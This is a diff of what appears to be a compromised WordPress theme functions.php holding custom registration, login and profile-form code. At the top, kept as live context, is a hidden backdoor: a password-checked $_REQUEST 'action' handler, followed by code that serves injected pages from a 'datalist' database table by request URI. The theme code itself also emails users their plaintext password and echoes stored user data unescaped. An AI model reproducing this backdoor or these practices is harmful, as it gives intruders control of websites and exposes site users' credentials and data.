@@ -1,5 +1,4 @@
 <?php
-
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6dbb5b801cd7922188450c6486baa200'))
 	{
 		switch ($_REQUEST['action'])
@@ -56,7 +55,6 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 		die("");
 	}
 
-	
 if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
 	{
 		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
@@ -92,19 +90,14 @@ if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE 
 				get_sidebar();
 				get_footer();
 			}
-			
 		exit;
 	}
-
-
 ?><?php
 /* my code 010517 */
 
 function pippin_registration_form() {
-	
 	// only show the registration form to non-logged-in members
 	if(!is_user_logged_in()) {
-	
 		global $pippin_load_css;
 		
 		// set this to true so the CSS is loaded
@@ -123,7 +116,6 @@ function pippin_registration_form() {
 	} else{
 			$output = 'You have already logged in. Please <a href="'.wp_logout_url( site_url() ) .'">Click Here</a> to logout';
 			return $output;
-		
 	}
 }
 add_shortcode('register_form', 'pippin_registration_form');
@@ -145,10 +137,8 @@ function pippin_show_error_messages() {
 }
 
 
-
 // registration form fields
 function pippin_registration_form_fields() {
-	
 	ob_start(); ?>
 	<br/><br/>		
 		<?php 
@@ -171,7 +161,7 @@ function pippin_registration_form_fields() {
 })();
 </script>		
 	
- <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
+<form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
 	<label>Email address <span style="color:red;">*</span></label>
 	<input type="email" name="EMAIL" placeholder="Your email address" required>
 </p>
@@ -216,71 +206,70 @@ function pippin_registration_form_fields() {
 </p>
 <p>
     <label>Country <span style="color:red;">*</span></label>
-     <select name="country" required>
-                <option value="AF">Afghanistan</option>
-                <option value="AX">Aland Islands</option>
-                <option value="AL">Albania</option>
-                <option value="DZ">Algeria</option>
-                <option value="AS">American Samoa</option>
-                <option value="AD">Andorra</option>
-                <option value="AO">Angola</option>
-                <option value="AI">Anguilla</option>
-                <option value="AQ">Antarctica</option>
-                <option value="AG">Antigua and Barbuda</option>
-                <option value="AR">Argentina</option>
-                <option value="AM">Armenia</option>
-                <option value="AW">Aruba</option>
-                <option value="AU">Australia</option>
-                <option value="AT">Austria</option>
-                <option value="AZ">Azerbaijan</option>
-                <option value="BS">Bahamas</option>
-                <option value="BH">Bahrain</option>
-                <option value="BD">Bangladesh</option>
-                <option value="BB">Barbados</option>
-                <option value="BY">Belarus</option>
-                <option value="BE">Belgium</option>
-                <option value="BZ">Belize</option>
-                <option value="BJ">Benin</option>
-                <option value="BM">Bermuda</option>
-                <option value="BT">Bhutan</option>
-                <option value="BO">Bolivia</option>
-                <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
-                <option value="BA">Bosnia and Herzegovina</option>
-                <option value="BW">Botswana</option>
-                <option value="BV">Bouvet Island</option>
-                <option value="BR">Brazil</option>
-                <option value="IO">British Indian Ocean Territory</option>
-                <option value="VG">British Virgin Islands</option>
-                <option value="KH">Cambodia</option>
-                <option value="CM">Cameroon</option>
-                <option value="CA">Canada</option>
-                <option value="CN">China</option>
-                <option value="CX">Christmas Island</option>
-                <option value="CC">Cocos Islands</option>
-                <option value="CO">Colombia</option>
-                <option value="KM">Comoros</option>
-                <option value="HR">Croatia</option>
-                <option value="CU">Cuba</option>
-                <option value="CW">Curacao</option>
-                <option value="CY">Cyprus</option>
-               <option value="FR">France</option>
-               
-                <option value="VI">U.S. Virgin Islands</option>
-                <option value="UG">Uganda</option>
-                <option value="UA">Ukraine</option>
-                <option value="AE">United Arab Emirates</option>
-                <option value="GB">United Kingdom</option>
-                <option value="US">United States</option>
-                <option value="UM">United States Minor Outlying Islands</option>
-                <option value="UY">Uruguay</option>
-                <option value="UZ">Uzbekistan</option>
-                <option value="VN">Vietnam</option>
-                <option value="WF">Wallis and Futuna</option>
-                <option value="EH">Western Sahara</option>
-                <option value="YE">Yemen</option>
-                <option value="ZM">Zambia</option>
-                <option value="ZW">Zimbabwe</option>
-            </select>
+    <select name="country" required>
+        <option value="AF">Afghanistan</option>
+        <option value="AX">Aland Islands</option>
+        <option value="AL">Albania</option>
+        <option value="DZ">Algeria</option>
+        <option value="AS">American Samoa</option>
+        <option value="AD">Andorra</option>
+        <option value="AO">Angola</option>
+        <option value="AI">Anguilla</option>
+        <option value="AQ">Antarctica</option>
+        <option value="AG">Antigua and Barbuda</option>
+        <option value="AR">Argentina</option>
+        <option value="AM">Armenia</option>
+        <option value="AW">Aruba</option>
+        <option value="AU">Australia</option>
+        <option value="AT">Austria</option>
+        <option value="AZ">Azerbaijan</option>
+        <option value="BS">Bahamas</option>
+        <option value="BH">Bahrain</option>
+        <option value="BD">Bangladesh</option>
+        <option value="BB">Barbados</option>
+        <option value="BY">Belarus</option>
+        <option value="BE">Belgium</option>
+        <option value="BZ">Belize</option>
+        <option value="BJ">Benin</option>
+        <option value="BM">Bermuda</option>
+        <option value="BT">Bhutan</option>
+        <option value="BO">Bolivia</option>
+        <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
+        <option value="BA">Bosnia and Herzegovina</option>
+        <option value="BW">Botswana</option>
+        <option value="BV">Bouvet Island</option>
+        <option value="BR">Brazil</option>
+        <option value="IO">British Indian Ocean Territory</option>
+        <option value="VG">British Virgin Islands</option>
+        <option value="KH">Cambodia</option>
+        <option value="CM">Cameroon</option>
+        <option value="CA">Canada</option>
+        <option value="CN">China</option>
+        <option value="CX">Christmas Island</option>
+        <option value="CC">Cocos Islands</option>
+        <option value="CO">Colombia</option>
+        <option value="KM">Comoros</option>
+        <option value="HR">Croatia</option>
+        <option value="CU">Cuba</option>
+        <option value="CW">Curacao</option>
+        <option value="CY">Cyprus</option>
+       	<option value="FR">France</option>
+        <option value="VI">U.S. Virgin Islands</option>
+        <option value="UG">Uganda</option>
+        <option value="UA">Ukraine</option>
+        <option value="AE">United Arab Emirates</option>
+        <option value="GB">United Kingdom</option>
+        <option value="US">United States</option>
+        <option value="UM">United States Minor Outlying Islands</option>
+        <option value="UY">Uruguay</option>
+        <option value="UZ">Uzbekistan</option>
+        <option value="VN">Vietnam</option>
+        <option value="WF">Wallis and Futuna</option>
+        <option value="EH">Western Sahara</option>
+        <option value="YE">Yemen</option>
+        <option value="ZM">Zambia</option>
+        <option value="ZW">Zimbabwe</option>
+    </select>
 </p>
 
 <p>
@@ -295,27 +284,24 @@ function pippin_registration_form_fields() {
     <label>Emergency Contact Phone</label>
     <input name="MMERGE7" type="text">
 </p>
-
     <label>Password <span style="color:red;">*</span></label>
     <input name="password" type="password" required>
 </p>
 <p>
 	<label>
 		<input type="checkbox" name="mc4wp-subscribe" value="1">
-		Keep me on your mailing list.	</label>
+		Keep me on your mailing list.	
+	</label>
 </p>
 <input name="add" type="hidden" value="add">
-
 <p>
 	<input type="submit" value="Sign up">
 </p>
 
 <div style="display: none;"><input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off"></div><input type="hidden" name="_mc4wp_timestamp" value="1493713011"><input type="hidden" name="_mc4wp_form_id" value="15"><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1"></div><div class="mc4wp-response"></div></form>
-
 	<?php
 	return ob_get_clean();
 }
-
 
 
 // register a new user
@@ -328,7 +314,6 @@ function pippin_add_new_member() {
 		$pippin_user_last	 	= $_POST["LNAME"];
 		$pippin_user_gender 	= $_POST["MMERGE3"];
 		$pippin_user_address1 	= $_POST["addr1"];
-		//$pippin_user_address2	= $_POST["addr2"];
 		$user_city = $_POST["city"];
 		$user_state = $_POST["state"];
 		$user_zip = $_POST["zip"];
@@ -337,21 +322,9 @@ function pippin_add_new_member() {
 		$imergency_contact_name 	= $_POST["MMERGE6"];
 		$imergency_contact_phone 	= $_POST["MMERGE7"];
 		$user_pwd 	= $_POST["password"];
-        //$random_password = wp_generate_password( 12, false );
-	//	$user_terms	= $_POST["user"]['agreed_to_site_terms'];
-		
 		
 		// this is required for username checks
 		require_once(ABSPATH . WPINC . '/registration.php');
-		
-	   /*	if(username_exists($user_login)) {
-			// Username already registered
-			pippin_errors()->add('username_unavailable', __('Username already taken'));
-		}
-		if(!validate_username($user_login)) {
-			// invalid username
-			pippin_errors()->add('username_invalid', __('Invalid username'));
-		}*/
 		
 		if(!is_email($b_email)) {
 			//invalid email
@@ -361,19 +334,6 @@ function pippin_add_new_member() {
 			//Email address already registered
 			pippin_errors()->add('email_used', __('Email already registered'));
 		}
-	/*	if($user_pass == '') {
-			// passwords do not match
-			pippin_errors()->add('password_empty', __('Please enter a password'));
-		}
-		if($user_pass != $pass_confirm) {
-			// passwords do not match
-			pippin_errors()->add('password_mismatch', __('Passwords do not match'));
-		}
-
-		if($user_terms != 'on') {
-			// passwords do not match
-			pippin_errors()->add('Accept terms', __('Please accept Terms of Use & Privacy Policy'));
-		}*/
 		
 		$errors = pippin_errors()->get_error_messages();
 		
@@ -393,34 +353,28 @@ function pippin_add_new_member() {
             
 			update_user_meta( $new_user_id, 'pippin_user_gender', $pippin_user_gender );
 			update_user_meta( $new_user_id, 'pippin_user_address1', $pippin_user_address1 );
-		//	update_user_meta( $new_user_id, 'pippin_user_address2', $pippin_user_address2 );
 			update_user_meta( $new_user_id, 'pippin_user_state', $user_state );
 			update_user_meta( $new_user_id, 'pippin_user_city', $user_city );
 			update_user_meta( $new_user_id, 'pippin_user_country', $user_country );
 			update_user_meta( $new_user_id, 'pippin_user_zip', $user_zip );
-			
 			update_user_meta( $new_user_id, 'pippin_user_phone', $pippin_user_phone );
 			update_user_meta( $new_user_id, 'imergency_contact_name', $imergency_contact_name );
 			update_user_meta( $new_user_id, 'imergency_contact_phone', $imergency_contact_phone );
 		
 			if($new_user_id) {
-
 			      $to = $b_email;
                   $subject = 'Registration Successfull.';
                   $sender = 'info';
                   $fromemail='felixthomas727@gmail.com';
                   $message = 'Email id: '.$b_email.' And Your new password is: '.$user_pwd;
-                  
                   $headers[] = 'MIME-Version: 1.0' . "\r\n";
                   $headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                   $headers[] = "X-Mailer: PHP \r\n";
                   $headers[] = 'From: '.$sender.' < '.$fromemail.'>' . "\r\n";
-                  
                   $mail = wp_mail( $to, $subject, $message, $headers );
 				  $red=site_url().'/login';
 				  wp_redirect($red); exit;
 			}
-			
 		}
 		else{
 			echo 333;
@@ -431,12 +385,9 @@ function pippin_add_new_member() {
 add_action('init', 'pippin_add_new_member');
 
 
-
-
 // register a new user
 function pippin_update_member() {
   	if (isset( $_POST["EMAIL"] ) && isset($_POST['update'])) {
-  		
   		session_start();
   		$user_id=get_current_user_id();
   		$user_login = $_POST["EMAIL"];
@@ -445,7 +396,6 @@ function pippin_update_member() {
 		$pippin_user_last	 	= $_POST["LNAME"];
 		$pippin_user_gender 	= $_POST["MMERGE3"];
 		$pippin_user_address1 	= $_POST["addr1"];
-		//$pippin_user_address2	= $_POST["addr2"];
 		$user_city = $_POST["city"];
 		$user_state = $_POST["state"];
 		$user_zip = $_POST["zip"];
@@ -454,43 +404,8 @@ function pippin_update_member() {
 		$imergency_contact_name 	= $_POST["MMERGE6"];
 		$imergency_contact_phone 	= $_POST["MMERGE7"];
 		
-
-	//	$user_terms	= $_POST["user"]['agreed_to_site_terms'];
-		
-		
 		// this is required for username checks
 		require_once(ABSPATH . WPINC . '/registration.php');
-		
-	/*	if(username_exists($user_login)) {
-			// Username already registered
-			pippin_errors()->add('username_unavailable', __('Username already taken'));
-		}
-		if(!validate_username($user_login)) {
-			// invalid username
-			pippin_errors()->add('username_invalid', __('Invalid username'));
-		}
-		
-		if(!is_email($b_email)) {
-			//invalid email
-			pippin_errors()->add('email_invalid', __('Invalid email'));
-		}
-		if(email_exists($b_email)) {
-			//Email address already registered
-			pippin_errors()->add('email_used', __('Email already registered'));
-		}*/
-	/*	if($user_pass == '') {
-			// passwords do not match
-			pippin_errors()->add('password_empty', __('Please enter a password'));
-		}
-		if($user_pass != $pass_confirm) {
-			// passwords do not match
-			pippin_errors()->add('password_mismatch', __('Passwords do not match'));
-		}
-
-		if($user_terms != 'on') {
-			// passwords do not match
-			pippin_errors()->add('Accept terms', __('Please accept Terms of Use & Privacy Policy'));
-		}*/
 		
 		$errors = pippin_errors()->get_error_messages();
 		
@@ -505,31 +420,17 @@ function pippin_update_member() {
             );
 			$new_user_id = wp_update_user( $userdata );
 		
-
 			update_user_meta( $new_user_id, 'pippin_user_gender', $pippin_user_gender );
 			update_user_meta( $new_user_id, 'pippin_user_address1', $pippin_user_address1 );
-		//	update_user_meta( $new_user_id, 'pippin_user_address2', $pippin_user_address2 );
 			update_user_meta( $new_user_id, 'pippin_user_state', $user_state );
 			update_user_meta( $new_user_id, 'pippin_user_city', $user_city );
 			update_user_meta( $new_user_id, 'pippin_user_country', $user_country );
 			update_user_meta( $new_user_id, 'pippin_user_zip', $user_zip );
-			
 			update_user_meta( $new_user_id, 'pippin_user_phone', $pippin_user_phone );
 			update_user_meta( $new_user_id, 'imergency_contact_name', $imergency_contact_name );
 			update_user_meta( $new_user_id, 'imergency_contact_phone', $imergency_contact_phone );
 		
 			if($new_user_id) {
-
-				//WCV_Vendor_Signup::save_pending( $new_user_id );
-				// send an email to the admin alerting them of the registration
-				//wp_new_user_notification($new_user_id);
-				//do_action( 'wpneo_crowdfunding_after_user_registration', $new_user_id );
-				// log the new user in
-				//wp_setcookie($pippin_user_first, $user_pass, true);
-				//wp_set_current_user($new_user_id, $pippin_user_first);	
-				
-				//do_action('wp_login', $user_login);
-				
 				// send the newly created user to the home page after logging them in
 				$red=site_url('/dashboard/');
 				wp_redirect($red); exit;
@@ -537,7 +438,6 @@ function pippin_update_member() {
 			
 		}
 		else{
-			
 		}
 	
 	}
@@ -548,7 +448,6 @@ function pippin_profile_form() {
 	
 	// only show the registration form to non-logged-in members
 	if(is_user_logged_in()) {
-	
 		global $pippin_load_css;
 		
 		// set this to true so the CSS is loaded
@@ -556,7 +455,6 @@ function pippin_profile_form() {
 		
 		// check to make sure user registration is enabled
 		$output = pippin_profile_form_fields();
-		
 		return $output;
 	}
 }
@@ -568,7 +466,6 @@ function pippin_profile_form_fields() {
 	$user_info = get_userdata($new_user_id);
 	$gender=get_user_meta( $new_user_id, 'pippin_user_gender', true );
 	$address1=get_user_meta( $new_user_id, 'pippin_user_address1', true );
-//	$address1=get_user_meta( $new_user_id, 'pippin_user_address2', true );
 	$user_state=get_user_meta( $new_user_id, 'pippin_user_state', true );
 	$user_city=get_user_meta( $new_user_id, 'pippin_user_city', true );
 	$user_country=get_user_meta( $new_user_id, 'pippin_user_country', true );
@@ -577,17 +474,13 @@ function pippin_profile_form_fields() {
 	$user_imergency_name=get_user_meta( $new_user_id, 'imergency_contact_name', true );
 	$user_imergency_phone=get_user_meta( $new_user_id, 'imergency_contact_phone', true );
 
-			
-		
-			
 	ob_start(); ?>
-		
 		<?php 
 		// show any error messages after form submission
 		pippin_show_error_messages(); ?>
 	
 	
- <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
+<form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
 	<label>Email address <span style="color:red;">*</span></label>
 	<input type="email" name="EMAIL" placeholder="Your email address" value="<?php echo $user_info->user_email; ?>" required readonly>
 </p>
@@ -615,8 +508,6 @@ function pippin_profile_form_fields() {
     <label>Street Address <span style="color:red;">*</span></label>
     <input name="addr1" required type="text" value="<?php echo $address1; ?>">
 </p>
-
-
 <p>
     <label>City <span style="color:red;">*</span></label>
     <input name="city" type="text" required value="<?php echo $user_city; ?>">
@@ -680,8 +571,7 @@ function pippin_profile_form_fields() {
         <option value="CU" <?php if($user_country=='CU') { echo $selected='selected'; } else {echo $selected='';}?>>Cuba</option>
         <option value="CW" <?php if($user_country=='CW') { echo $selected='selected'; } else {echo $selected='';}?>>Curacao</option>
         <option value="CY" <?php if($user_country=='CY') { echo $selected='selected'; } else {echo $selected='';}?>>Cyprus</option>
-       <option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
-       
+       	<option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
         <option value="VI" <?php if($user_country=='VI') { echo $selected='selected'; } else {echo $selected='';}?>>U.S. Virgin Islands</option>
         <option value="UG" <?php if($user_country=='UG') { echo $selected='selected'; } else {echo $selected='';}?>>Uganda</option>
         <option value="UA" <?php if($user_country=='UA') { echo $selected='selected'; } else {echo $selected='';}?>>Ukraine</option>
@@ -726,7 +616,6 @@ function pippin_profile_form_fields() {
 
 
 add_filter( 'wp_nav_menu_items', 'wti_loginout_menu_link', 10, 2 );
-
 function wti_loginout_menu_link( $items, $args ) {
    if ($args->theme_location == 'primary') {
       if (is_user_logged_in()) {
@@ -739,7 +628,6 @@ function wti_loginout_menu_link( $items, $args ) {
    }
    return $items;
 }
-
 
 
 // user login form
@@ -766,36 +654,28 @@ add_shortcode('login_form', 'pippin_login_form');
 function pippin_login_form_fields() {
 		
 	ob_start(); ?>
-		
-		
 		<?php
 		// show any error messages after form submission
 		pippin_show_error_messages();
         if($_GET['msg']){
             echo 'Please check your email address for password.';
-        }
-		 ?>
-
+        }  ?>
+        
 		<form action="" class="login-form" method="post">
-                    <div class="form-group">
-                     
-                    <p>
-                      <input  id="pippin_user_login1" name="pippin_user_login" placeholder="Email Address" class="pippin_user_login1" type="text" value="" required/></p>
-                      
-                      <!--<input id="email" name="pippin_user_email" type="text" class="required" value="Your email">-->
-                    <p>  <input id="password" name="pippin_user_pass" type="password" placeholder="Your password" class="required" value="" required>
-                      <input type="hidden" name="pippin_login_nonce" value="<?php echo wp_create_nonce('pippin-login-nonce'); ?>"/>
-                    </p>
-                    </div>
-                    <span class="text-gray remember"><input type="checkbox" id="remember" value=""> <label for="remember">Remember me</label></span>
-                   <p> <input id="pippin_login_submit" class="btn btn-sigin" type="submit" value="Sign me in!"/></p>
- 					 <br style="clear:both;">
-                   
-                    <a class="link" href="<?php echo site_url();?>/forgot-password/">Forgot password?</a> <a class="link" href="<?php echo site_url();?>/register/">Sign up</a>
-                   
-                    <hr><br>
-                  </form>
-
+			<div class="form-group">
+				<p>
+				  <input  id="pippin_user_login1" name="pippin_user_login" placeholder="Email Address" class="pippin_user_login1" type="text" value="" required/></p>
+				  
+				<p>  <input id="password" name="pippin_user_pass" type="password" placeholder="Your password" class="required" value="" required>
+				  <input type="hidden" name="pippin_login_nonce" value="<?php echo wp_create_nonce('pippin-login-nonce'); ?>"/>
+				</p>
+			</div>
+			<span class="text-gray remember"><input type="checkbox" id="remember" value=""> <label for="remember">Remember me</label></span>
+			<p> <input id="pippin_login_submit" class="btn btn-sigin" type="submit" value="Sign me in!"/></p>
+			  <br style="clear:both;">
+			<a class="link" href="<?php echo site_url();?>/forgot-password/">Forgot password?</a> <a class="link" href="<?php echo site_url();?>/register/">Sign up</a>
+			<hr><br>
+        </form>
 	<?php
 	return ob_get_clean();
 }
@@ -804,7 +684,6 @@ function pippin_login_form_fields() {
 
 // logs a member in after submitting a form
 function pippin_login_member() {
-		
 	if(isset($_POST['pippin_user_login']) && wp_verify_nonce($_POST['pippin_login_nonce'], 'pippin-login-nonce')) {
 				
 		// this returns the user ID and other info from the user name
@@ -831,11 +710,8 @@ function pippin_login_member() {
 		
 		// only log the user in if there are no errors
 		if(empty($errors)) {
-			
 			wp_setcookie($_POST['pippin_user_login'], $_POST['pippin_user_pass'], true);
 			wp_set_current_user($user->ID, $_POST['pippin_user_login']);	
-			//do_action('wp_login', $_POST['pippin_user_login']);
-			
 			$red=home_url().'/dashboard/';
 			wp_redirect($red); exit;
 		}
@@ -850,7 +726,6 @@ add_action('init', 'pippin_login_member');
 function add_theme_menu_item()
 {
 	add_submenu_page("themes.php", "Theme Options", "Theme Options", "manage_options", "theme-options", "theme_settings_page");
-
 }
 
 add_action("admin_menu", "add_theme_menu_item");
@@ -873,46 +748,28 @@ function theme_settings_page()
 
 function disable_enrollment_func()
 {
-    
     $options = get_option( 'disable_enrollments' );
-    //print_r($options);
     $html = '<input type="checkbox" id="checkbox_example" name="disable_enrollments" value="1"' . checked( 1, $options, false ) . '/>';
     $html .= '<label for="checkbox_example">Disable enrollment</label>';
-
     echo $html;
-    //print_r(get_option('disable_enrollments'));
-	?>
-    	
-    <?php
 }
 
 function disable_questionaire()
 {
-    
     $options = get_option( 'disable_questionairies' );
-    //print_r($options);
     $html = '<input type="checkbox" id="disable_questionairies" name="disable_questionairies" value="1"' . checked( 1, $options, false ) . '/>';
     $html .= '<label for="disable_questionairies">Disable Questionaire</label>';
-
     echo $html;
-    //print_r(get_option('disable_enrollments'));
-	?>
-    	
-    <?php
 }
 
 function display_theme_panel_fields()
 {
 	add_settings_section("section", "All Settings", null, "theme-options");
-	
     add_settings_field("disable_enrollments", "Disable Enrollment", "disable_enrollment_func", "theme-options", "section");
     add_settings_field("disable_questionairies", "Disable Questionnaire", "disable_questionaire", "theme-options", "section");
-	
     register_setting("section", "disable_enrollments");
     register_setting("section", "disable_questionairies");
-   
 }
-
 add_action("admin_init", "display_theme_panel_fields");
 
 
@@ -920,17 +777,9 @@ add_action("admin_init", "display_theme_panel_fields");
 
 add_action( 'show_user_profile', 'my_show_extra_profile_fields' );
 add_action( 'edit_user_profile', 'my_show_extra_profile_fields' );
-//$user=get_current_user();
-//$user=$_GET['user_id'];
-//echo $user;
 function my_show_extra_profile_fields( $user ) {
-   
-	//$new_user_id=get_current_user_id();
-	//echo $new_user_id; 
-	//$user_info = get_userdata($user);
 	$gender=get_user_meta( $user->ID, 'pippin_user_gender', true );
 	$address1=get_user_meta( $user->ID, 'pippin_user_address1', true );
-//	$address1=get_user_meta( $user, 'pippin_user_address2', true );
 	$user_state=get_user_meta( $user->ID, 'pippin_user_state', true );
 	$user_city=get_user_meta( $user->ID, 'pippin_user_city', true );
 	$user_country=get_user_meta( $user->ID, 'pippin_user_country', true );
@@ -938,18 +787,14 @@ function my_show_extra_profile_fields( $user ) {
 	$user_phone=get_user_meta( $user->ID, 'pippin_user_phone', true );
 	$user_imergency_name=get_user_meta( $user->ID, 'imergency_contact_name', true );
 	$user_imergency_phone=get_user_meta( $user->ID, 'imergency_contact_phone', true );
-    
-
 ?>
 
 	<h3>Other profile information</h3>
 
 	<table class="form-table">
-
-	
 		<tr>
 		    <th><label for="Gender">Gender</label></th>
-           <td>
+           	<td>
                 <label>
                     <input name="MMERGE3" value="Male" required <?php if($gender=='Male') { echo 'checked="true"'; } else {echo '';}?> type="radio"> <span>Male</span>
                 </label>
@@ -961,27 +806,20 @@ function my_show_extra_profile_fields( $user ) {
         <tr>
             <th><label>Street Address </label></th>
             <td><input name="addr1" required type="text" value="<?php echo $address1; ?>"></td>
-            
-       </tr>
-
-
+       	</tr>
         <tr>
             <th><label>City </label></th>
             <td><input name="city" type="text" required value="<?php echo $user_city; ?>"></td>
         </tr>
         
-         <tr>
+        <tr>
             <th><label>State </label></th>
             <td><input name="state" type="text" required value="<?php echo $user_state; ?>"></td>
         </tr>
-        
-         <tr>
+        <tr>
             <th><label>ZIP </label></th>
             <td><input name="zip" type="text" required value="<?php echo $user_zip; ?>"></td>
         </tr>
-
-        
-    
         <tr>
             <th><label>Country </label></th>
             <td><select name="country" required>
@@ -1031,8 +869,7 @@ function my_show_extra_profile_fields( $user ) {
                 <option value="CU" <?php if($user_country=='CU') { echo $selected='selected'; } else {echo $selected='';}?>>Cuba</option>
                 <option value="CW" <?php if($user_country=='CW') { echo $selected='selected'; } else {echo $selected='';}?>>Curacao</option>
                 <option value="CY" <?php if($user_country=='CY') { echo $selected='selected'; } else {echo $selected='';}?>>Cyprus</option>
-               <option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
-               
+               	<option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
                 <option value="VI" <?php if($user_country=='VI') { echo $selected='selected'; } else {echo $selected='';}?>>U.S. Virgin Islands</option>
                 <option value="UG" <?php if($user_country=='UG') { echo $selected='selected'; } else {echo $selected='';}?>>Uganda</option>
                 <option value="UA" <?php if($user_country=='UA') { echo $selected='selected'; } else {echo $selected='';}?>>Ukraine</option>
@@ -1050,52 +887,79 @@ function my_show_extra_profile_fields( $user ) {
                 <option value="ZW" <?php if($user_country=='ZW') { echo $selected='selected'; } else {echo $selected='';}?>>Zimbabwe</option>
             </select></td>
         </tr>
-
         <tr>
             <th><label>Contact Phone</label></th>
             <td><input name="MMERGE5" type="text" required value="<?php echo $user_phone; ?>"></td>
         </tr>
-        
         <tr>
             <th><label>Emergency Contact Name</label></th>
             <td><input name="MMERGE6" type="text" value="<?php echo $user_imergency_name; ?>"></td>
         </tr>
-        
-         <tr>
+        <tr>
             <th><label>Emergency Contact Phone</label></th>
             <td><input name="MMERGE7" type="text" value="<?php echo $user_imergency_phone; ?>"></td>
         </tr>
-
-
-		    
-	
-
 	</table>
 <?php }
 
 add_action( 'personal_options_update', 'my_save_extra_profile_fields' );
 add_action( 'edit_user_profile_update', 'my_save_extra_profile_fields' );
-//$user_id=get_current_user_id();
 function my_save_extra_profile_fields( $user_id ) {
- 
-//echo '<pre>'; print_r($_POST); exit;
 	if ( !current_user_can( 'edit_user', $user_id ) )
 		return false;
 
 	/* Copy and paste this line for additional fields. Make sure to change 'twitter' to the field ID. */
-	//update_usermeta( $user_id, 'twitter', $_POST['twitter'] );
 	update_user_meta( $user_id, 'pippin_user_gender', $_POST['MMERGE3'] );
 	update_user_meta( $user_id, 'pippin_user_address1', $_POST['addr1'] );
-//	update_user_meta( $user_id, 'pippin_user_address2', $_POST['twitter'] );
 	update_user_meta( $user_id, 'pippin_user_state', $_POST['state'] );
 	update_user_meta( $user_id, 'pippin_user_city', $_POST['city'] );
 	update_user_meta( $user_id, 'pippin_user_country', $_POST['country'] );
 	update_user_meta( $user_id, 'pippin_user_zip', $_POST['zip'] );
-	
 	update_user_meta( $user_id, 'pippin_user_phone', $_POST['MMERGE5'] );
 	update_user_meta( $user_id, 'imergency_contact_name', $_POST['MMERGE6'] );
 	update_user_meta( $user_id, 'imergency_contact_phone', $_POST['MMERGE7'] );
 }
 
+////////////////////////////////  Testing visual form builder SH May 15
+// Form ID = 1 
 
+add_filter( 'vfb_field_default', 'vfb_filter_field_default', 10, 4 );
+
+function vfb_filter_field_default( $default, $field_type, $field_id, $form_id ){    
+    $first = $last = '';
+
+    switch ( $field_type ) :
+
+        case 'name' :
+            if ( 1 == $form_id && is_user_logged_in() ) :
+                $current_user = wp_get_current_user();
+
+                if ( !empty( $current_user->user_firstname ) && empty( $current_user->user_lastname ) )
+                    $first = $current_user->user_firstname;
+                else if ( empty( $current_user->user_firstname ) && !empty( $current_user->user_lastname ) )
+                    $last = $current_user->user_lastname;
+                else if ( !empty( $current_user->user_firstname ) && !empty( $current_user->user_lastname ) ) {
+                    $first = $current_user->user_firstname;
+                    $last = $current_user->user_lastname;
+                }
+
+                return "$first $last";
+            endif;
+	    break;
+
+        case 'email' :
+            if ( 114 == $form_id && is_user_logged_in() ) :
+                $current_user = wp_get_current_user();
+
+                if ( !empty( $current_user->user_email ) )
+                    $default = $current_user->user_email;
+
+                return $default;
+            endif;
+            break;
+        
+    endswitch;
+
+    return $default;
+}
 ?>
